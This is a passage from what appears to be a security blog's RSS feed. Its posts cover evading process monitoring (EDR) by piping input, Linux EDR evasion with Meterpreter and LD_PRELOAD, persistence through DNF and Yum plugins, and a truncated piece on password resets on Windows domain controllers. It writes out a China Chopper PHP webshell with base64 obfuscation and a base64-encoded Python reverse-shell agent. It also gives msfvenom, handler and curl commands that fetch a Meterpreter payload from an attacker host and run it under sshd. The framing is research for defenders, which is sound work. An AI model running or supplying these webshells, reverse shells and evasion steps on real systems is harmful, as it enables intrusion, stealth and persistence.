+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&apos;password&apos;]);?&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; china-chopper.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This command creates a webshell (without uploading a file) an adversary can use to issue further commands in an easier format. We can easily write an endpoint-based detection for this by looking for command lines including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@eval($_POST&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Adversaries can make this more difficult by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; to obscure what they write into a file:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo &quot;&amp;lt;?php @eval($_POST[&apos;password&apos;]);?&amp;gt;&quot; | base64
+PD9waHAgQGV2YWwoWydwYXNzd29yZCddKTs/Pgo=
+
+$ sh -c echo PD9waHAgQGV2YWwoWydwYXNzd29yZCddKTs/Pgo= | base64 -d &amp;gt; china-chopper.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This creation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;china-chopper.php&lt;/code&gt; achieves the same result but evades command-line based detections of the webshell contents.&lt;/p&gt;
+
+&lt;p&gt;In another example, let’s look at an Empire Python agent:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import base64,sys;exec(base64.b64decode(aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjEwLjEwJyw4NDQzKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==)&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we examine this process with tools like EDR, we’ll see the malicious Python code in the command line arguments for the process. We can easily write a detection for suspicious Python command line value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec(base64.b64decode(&lt;/code&gt;. Adversaries can bypass this using piping again:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;aW1wb3J0IGJhc2U2NCxzeXM7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKGFXMXdiM0owSUhOdlkydGxkQ3h6ZEhKMVkzUXNkR2x0WlFwbWIzSWdlQ0JwYmlCeVlXNW5aU2d4TUNrNkNnbDBjbms2Q2drSmN6MXpiMk5yWlhRdWMyOWphMlYwS0RJc2MyOWphMlYwTGxOUFEwdGZVMVJTUlVGTktRb0pDWE11WTI5dWJtVmpkQ2dvSnpFd0xqRXdMakV3TGpFd0p5dzRORFF6S1NrS0NRbGljbVZoYXdvSlpYaGpaWEIwT2dvSkNYUnBiV1V1YzJ4bFpYQW9OU2tLYkQxemRISjFZM1F1ZFc1d1lXTnJLQ2MrU1Njc2N5NXlaV04yS0RRcEtWc3dYUXBrUFhNdWNtVmpkaWhzS1FwM2FHbHNaU0JzWlc0b1pDazhiRG9LQ1dRclBYTXVjbVZqZGloc0xXeGxiaWhrS1NrS1pYaGxZeWhrTEhzbmN5YzZjMzBwQ2c9PSk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; | python
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This Python execution is much harder to investigate using EDR and similar tools. In this case, an adversary can hide their command line options using more &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoding and use piping to pass the code as input. When we investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; process in EDR, there will be no command lines showing the contents of the executed script. Instead, the process has read the script it needs to execute from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt;, which likely won’t be captured by tools. Best of all, this is functionally the same as the previous command.&lt;/p&gt;
+
+&lt;h2 id=&quot;improving-security-tools&quot;&gt;Improving Security Tools&lt;/h2&gt;
+
+&lt;p&gt;In my adventures so far with security tools it seems that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; is sometimes a blind spot, especially when piping is used. One of the better ways to improve tools in the next few years would be adding the ability to inspect these streams where possible.&lt;/p&gt;
+
+&lt;p&gt;For those of you joining me on the road to RHCSA 8, good luck when studying!&lt;/p&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://man7.org/linux/man-pages/man3/stdin.3.html&quot;&gt;stdin manpage&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Sat, 29 Feb 2020 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/redhat/rhcsa/linux/certification/redirection/input/output/piping/python/base64/bash/2020/02/29/road-to-rhcsa8-input-redirection.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/redhat/rhcsa/linux/certification/redirection/input/output/piping/python/base64/bash/2020/02/29/road-to-rhcsa8-input-redirection.html</guid>
+        
+        
+        <category>RedHat</category>
+        
+        <category>RHCSA</category>
+        
+        <category>Linux</category>
+        
+        <category>certification</category>
+        
+        <category>redirection</category>
+        
+        <category>input</category>
+        
+        <category>output</category>
+        
+        <category>piping</category>
+        
+        <category>python</category>
+        
+        <category>base64</category>
+        
+        <category>bash</category>
+        
+      </item>
+    
+      <item>
+        <title>Linux EDR Evasion With Meterpreter and LD_PRELOAD</title>
+        <description>&lt;p&gt;Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it’s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I’ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-setup&quot;&gt;The Setup&lt;/h2&gt;
+
+&lt;p&gt;To get started, I’m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim. You don’t have to limit yourself to this setup, but it’s what works for me at the moment.&lt;/p&gt;
+
+&lt;p&gt;On the victim system, the only access needed is code execution and the ability to transfer a payload.&lt;/p&gt;
+
+&lt;p&gt;On my attacker machine, I need to generate a Meterpeter payload within a shared object library format. To do this, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.57 LPORT=2022 -f elf-so &amp;gt; meterpreter.so
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, we need a way to transfer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter.so&lt;/code&gt; to the victim system. This may be done via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; command or another method of downloading/uploading files.&lt;/p&gt;
+
+&lt;p&gt;In my case, I used NGINX to host the SO library from my Kali machine for download:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cp meterpreter.so /var/www/html/
+# systemctl start nginx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, we need to set up a handler to receive the connection and use it in Metasploit. To do this, we can work with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# msfconsole
+
+# msf5 &amp;gt; use exploit/multi/handler
+# msf5 &amp;gt; set payload linux/x64/meterpreter/reverse_tcp
+# msf5 &amp;gt; set LHOST 10.10.10.57
+# msf5 &amp;gt; set LPORT 2022
+# msf5 &amp;gt; run
+
+[*] Started reverse TCP handler on 10.10.10.57:2022
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we move to our victim system for execution!&lt;/p&gt;
+
+&lt;h2 id=&quot;the-execution&quot;&gt;The Execution&lt;/h2&gt;
+
+&lt;p&gt;On my victim system, I downloaded the SO library using a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -O http://10.10.10.57/meterpreter.so
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From here I can pick any process I want to attribute execution to, as long as it isn’t statically compiled. In this case, I’m choosing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt; since it often makes network connections and because some network admins use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp/2022&lt;/code&gt; to obscure their SSH service availability.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ LD_PRELOAD=./meterpreter.so sshd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once executed, control is never actually passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt;, and the process execution is controlled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter.so&lt;/code&gt; as it reports back for commands. It appears that the process is frozen, but it really isn’t.&lt;/p&gt;
+
+&lt;p&gt;On the Kali machine I see:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Sending stage (3021284 bytes) to 10.10.10.51
+[*] Meterpreter session 1 opened (10.10.10.57:2022 -&amp;gt; 10.10.10.51:39314) at 2020-02-06 20:05:00 -0600
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From Kali I can join the Meterpreter session and get access at the permission level of the victim’s user account:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; sysinfo
+Computer        : cent8-01.westeros.local
+OS              : CentOS 8.0.1905 (Linux 4.18.0-80.el8.x86_64)
+Architecture    : x64
+BuildTuple      : x86_64-linux-musl
+Meterpreter     : x64/linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we go to investigate with an EDR product, Auditd/Auditbeats logs, or osquery, the network connection and any actions will be attributed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt;. This requires a defender to be much sharper on their game to spot malicious activity and understand the behavior of system processes. Depending on the actions we want to perform and the ports available for C2, we could potentially do the same with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtpd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsftpd&lt;/code&gt;, etc.&lt;/p&gt;
+
+&lt;h2 id=&quot;how-does-it-work&quot;&gt;How Does It Work?&lt;/h2&gt;
+
+&lt;p&gt;Most of the time we can safely assume that SO libraries work in a similar fashion to DLLs on Windows. That is, the library must have an exported symbol that should be called for code to execute. We can inspect SO libraries for exported symbols using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nm&lt;/code&gt; command. Howver, when we inspect our generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter.so&lt;/code&gt; library we can notice something odd:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nm -D meterpreter.so
+nm: meterpreter.so: no symbols
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Oddly enough, it doesn’t look like our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter.so&lt;/code&gt; has any symbols to call, so how did &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt; know to execute the code within the SO library? This is because of a feature of the ELF binary format.&lt;/p&gt;
+
+&lt;p&gt;SO libraries follow the ELF binary format and include a section called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init&lt;/code&gt;. Any code placed within this section will execute when the library is loaded by a process and before control is passed to the process itself. The section is usually used by compilers for global constructors, but we can put nearly anything there for exploitation. When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; creates its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elf-so&lt;/code&gt; payloads, it embeds payloads within a template designed to house the payload within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init&lt;/code&gt; section for execution. That way, no process should need knowledge of symbols within the library for execution.&lt;/p&gt;
+
+&lt;p&gt;This is also the way payloads generated/used by the &lt;a href=&quot;https://github.com/dsnezhkov/zombieant&quot;&gt;Zombie Ant Farm&lt;/a&gt; project work.&lt;/p&gt;
+
+&lt;p&gt;The use of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init&lt;/code&gt; section also has an interesting limitation when combined with preloading- it can only be used effectively when you define &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt; for a single process. When executing Meterpreter in this fashion, the victim process will appear hung. This is because the Meterpreter code continuously executes before control is passed to the victim process’s main function. The rest of the process instructions will not execute until Meterpreter exits. This means that if you export &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt; to leverage this SO library or write the library path into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld.so.preload&lt;/code&gt;, it will cause serious instability. If you use a preload method that causes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;meterpreter.so&lt;/code&gt; to load into numerous or all processes, it will cause loads of processes, even ones needed for system operation, to hang immediately after loading the SO library. So, no bueno.&lt;/p&gt;
+
+&lt;h2 id=&quot;is-it-useful&quot;&gt;Is It Useful?&lt;/h2&gt;
+
+&lt;p&gt;Eh, it depends. We obviously already need code execution and a method of downloading code to a victim for this to be possible. I could see this being useful when combined with an RCE against publicly-available services to get a stable shell. That said, a simpler and safer route in terms of stability could also be the execution of a Python C2 agent. In the case of a Python agent, it would be slightly harder to cause the attribution of activity to a system process. This is not going to be an initial access method, it would be more useful for long-term evasion and persistence when combined with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_profile&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bashrc&lt;/code&gt; command execution.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 06 Feb 2020 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/ld_preload/linux/edr/evasion/meterpreter/2020/02/06/linux-edr-evasion-with-ld-preload.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/ld_preload/linux/edr/evasion/meterpreter/2020/02/06/linux-edr-evasion-with-ld-preload.html</guid>
+        
+        
+        <category>ld_preload</category>
+        
+        <category>linux</category>
+        
+        <category>edr</category>
+        
+        <category>evasion</category>
+        
+        <category>meterpreter</category>
+        
+      </item>
+    
+      <item>
+        <title>Exploiting Yum and DNF Plugins for Persistence</title>
+        <description>&lt;p&gt;Two Metasploit Framework modules have held my interest in the last few weeks: the ones for persistence using Linux package managers &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/apt_package_manager_persistence.rb&quot;&gt;apt&lt;/a&gt; and &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/yum_package_manager_persistence.rb&quot;&gt;Yum&lt;/a&gt;. While they require root privileges to exploit, they provide a novel persistence mechanism that is likely overlooked by defenders. While looking at these modules I noticed that persistence using DNF wasn’t included, and I set off to find a way to persist on Linux systems using DNF plugins.&lt;/p&gt;
+
+&lt;h2 id=&quot;whats-a-package-manager-anyway&quot;&gt;What’s a Package Manager, anyway?&lt;/h2&gt;
+
+&lt;p&gt;On Windows systems most folks download applications from sites on the Internet or install them from media such as CDs or DVDs. This proves to be a major threat to the stability and security of Windows as it lets users download and install unpredictable software. On the other side of the spectrum, it allows users to find and use software to improve their world.&lt;/p&gt;
+
+&lt;p&gt;For Linux distributions, the software installation model looks different. You can still download software from the Internet, but it is not usually distributed in binary form for Linux systems. In these cases, you’d need to download the source code from a trusted mirror, compile it, and resolve any dependencies needed to make the software work. This is unfriendly for inexperienced users and can cause misconfiguration. As systems developed, a more friendly form of software distribution evolved: packages. Packages became an easy way to distribute compiled binaries for specific Linux distro versions and the software that managed packages helped administrators automate dependency resolution and configuration.&lt;/p&gt;
+
+&lt;p&gt;Now, most Linux distributions have a package manager and consume one of a few package types. The most common are RPM Package Manager (RPM) and Debian (DEB) packages. RPM packages work with systems that derive from Red Hat Enterprise Linux. These include RHEL itself, CentOS, and Fedora. DEB packages work with systems that derive from Debian Linux. These include Debian, Ubuntu, Mint, ElementaryOS, and others.&lt;/p&gt;
+
+&lt;p&gt;On the RPM side, administrators used the &lt;a href=&quot;http://man7.org/linux/man-pages/man8/yum.8.html&quot;&gt;Yum&lt;/a&gt; command to interact with packages prior to RHEL/CentOS 8 and Fedora 22. After those builds, administrators began to use the &lt;a href=&quot;https://dnf.readthedocs.io/en/latest/command_ref.html&quot;&gt;dnf&lt;/a&gt; command. On the DEB side, administrators typically use the &lt;a href=&quot;http://manpages.ubuntu.com/manpages/eoan/man8/apt.8.html&quot;&gt;apt&lt;/a&gt; or apt-get commands to interact with packages. As these package managers became more complex, they included plugins or additional functionality to make package installation more extensible. A good example of this in Yum is the fastestmirror plugin that measures the speed of interaction with one or more update mirrors and helps Yum pick the fastest one.&lt;/p&gt;
+
+&lt;p&gt;For the rest of this post we will focus on Yum and DNF plugins. Some of this functionality also exists in apt, but that’s a story for another day.&lt;/p&gt;
+
+&lt;h2 id=&quot;foundational-yum-and-dnf-plugin-knowledge&quot;&gt;Foundational Yum and DNF Plugin Knowledge&lt;/h2&gt;
+
+&lt;p&gt;Yum and DNF are both written in Python and handle all the operations around package installation. From the terminal you’ll run commands such as this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/dnf install httpd
+/usr/bin/yum update
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since these tools are implemented in Python, their plugins are also Python.&lt;/p&gt;
+
+&lt;h3 id=&quot;yum&quot;&gt;Yum&lt;/h3&gt;
+
+&lt;p&gt;With Yum, we need a few things for plugin execution. First, plugins must be enabled in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/yum.conf&lt;/code&gt;. This is done with the line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins=1&lt;/code&gt;. Next, one or more plugin configurations present in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/yum/pluginconf.d&lt;/code&gt; directory must be enabled with a line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enabled=1&lt;/code&gt;. Finally, the Python plugin code itself lives in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/yum-plugins&lt;/code&gt; directory. When writing the plugin, the developer can set hook functions that will execute when Yum executes specific triggers.&lt;/p&gt;
+
+&lt;p&gt;As it so happens, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastestmirror&lt;/code&gt; plugin is always used by yum in its default state. An easy way to exploit this is to plant malicious code within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/yum-plugins/fastestmirror.py&lt;/code&gt;. This requires root privileges and will cause the malicious code to run as root every time Yum executes for installations or updates.&lt;/p&gt;
+
+&lt;h3 id=&quot;dnf&quot;&gt;DNF&lt;/h3&gt;
+
+&lt;p&gt;With DNF, the configuration and code paths change but most of the concepts stay the same. First, DNF configurations exist in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/dnf/dnf.conf&lt;/code&gt;. Plugins are enabled by default and are only disabled if a line similar to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins=False&lt;/code&gt; is present. Next, plugin configurations exist in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/dnf/plugins&lt;/code&gt; directory. Finally, the actual plugin code lives under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/python3.6/site-packages/dnf-plugins&lt;/code&gt; directory, but the path will change as Python versions change.&lt;/p&gt;
+
+&lt;p&gt;In DNF, we can target one specific plugin for persistence: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;generate_completion_cache.py&lt;/code&gt;. This plugin executes whenever an administrator runs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnf install&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnf update&lt;/code&gt; to speed up shell completion. It is distributed by default across Fedora, CentOS, and RHEL distributions. There doesn’t appear to be a specific configuration file that disables the plugin itself. Even in the &lt;a href=&quot;https://dnf-plugins-core.readthedocs.io/en/latest/generate_completion_cache.html&quot;&gt;dnf-plugins-core documentation&lt;/a&gt;, the plugin appears intended to always run in the background without user interaction. This is perfect for exploitation. To show, we can use vim to change the plugin code.&lt;/p&gt;
+
+&lt;p&gt;Change &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/python3.6/site-packages/dnf-plugins/generate_completion_cache.py&lt;/code&gt; to add the following code above &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import os.path&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
+os.system(‘touch /etc/root-marker’)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will give us proof that the plugin executed as root and wrote a file to disk.&lt;/p&gt;
+
+&lt;p&gt;Next, execute these commands (as root):&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnf update
+
+ls -l /etc/root-marker
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/root-marker&lt;/code&gt; exists, you have a successful execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/exploiting-dnf-plugins/successful-execution.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;detection-and-breakage&quot;&gt;Detection and Breakage&lt;/h2&gt;
+
+&lt;p&gt;I haven’t dived too far into detection for this technique. Process monitoring will show the code you add as spawning from an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; with the command line showing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnf update&lt;/code&gt; or a similar command. You may find luck monitoring for different &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt; system calls that spawn shell processes, scripts, or other utilities. Any Python code you add that does not spawn an external command will execute within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnf&lt;/code&gt; python instance itself. This will blend in with surrounding update activity.&lt;/p&gt;
+
+&lt;p&gt;This technique will probably break with package updates to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnf-plugins-core&lt;/code&gt;. In addition, you can revert the plugin file by reverting the added code.&lt;/p&gt;
+
+&lt;h2 id=&quot;why-not-just-change-dnf-itself&quot;&gt;Why not just change DNF itself?&lt;/h2&gt;
+
+&lt;p&gt;You can probably do that, I just zoomed in on the plugins for execution. If you want to modify DNF for persistence, you probably can.&lt;/p&gt;
+
+&lt;h2 id=&quot;is-it-useful&quot;&gt;Is it useful?&lt;/h2&gt;
+
+&lt;p&gt;It depends. This technique requires root/sudo privileges to use. The technique assumes you’re attempting to persist on a system that you’ve found either misconfigured or susceptible to privilege escalation. This path should not be your first stop for persistence if you only have user privileges.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 13 Jan 2020 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/dnf/yum/linux/plugin/persistence/2020/01/13/exploiting-yum-dnf-plugins.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/dnf/yum/linux/plugin/persistence/2020/01/13/exploiting-yum-dnf-plugins.html</guid>
+        
+        
+        <category>DNF</category>
+        
+        <category>Yum</category>
+        
+        <category>Linux</category>
+        
+        <category>Plugin</category>
+        
+        <category>Persistence</category>
+        
+      </item>
+    
+      <item>
+        <title>When Local Password Resets Aren&apos;t Local</title>
+        <description>&lt;h2 id=&quot;when-you-reset-a-domain-administrator-instead-of-local&quot;&gt;When You Reset a Domain Administrator Instead of Local&lt;/h2&gt;
+
+&lt;p&gt;During an IR engagement, one of my colleagues identified malicious activity where an adversary reset the password for a local administrator account. While this reset would gain the adversary access to the local administrator account, it might not have warranted an emergency. That is, until we noticed that the password reset occurred on a domain controller.&lt;/p&gt;
+
+&lt;h2 id=&quot;are-there-local-accounts-on-domain-controllers&quot;&gt;Are There Local Accounts on Domain Controllers?&lt;/h2&gt;
+
+&lt;p&gt;Well, that gets complicated. Security pros and IT generalists are usually aware of SAM account databases on Windows systems. These databases contain the credentials needed for user logons when no domain connections are present. In the absence of Active Directory, such as in workgroup or home network scenarios, the Windows systems will use the SAM account database to authenticate users. In some cases, users may also choose to logon with a local account in enterprise environments, authenticating from the SAM database instead of the domain controller.&lt;/p&gt;
+
+&lt;p&gt;Most Windows systems follow this same pattern, unless they are promoted to Active Directory domain controllers. Once this happens, the promoted DC will stop using the local SAM database for its own everyday authentication, instead it uses the Active Directory database stored in NTDS.dit. In addition, the “local” groups for the DC will be defined by the AD Built-In groups. If the DC is the first of a domain, the contents of the SAM account database are migrated into the new domain’s NTDS.dit database. If the DC is an addition to an existing domain, it will receive a replica of the NTDS.dit database to authenticate from.&lt;/p&gt;
+
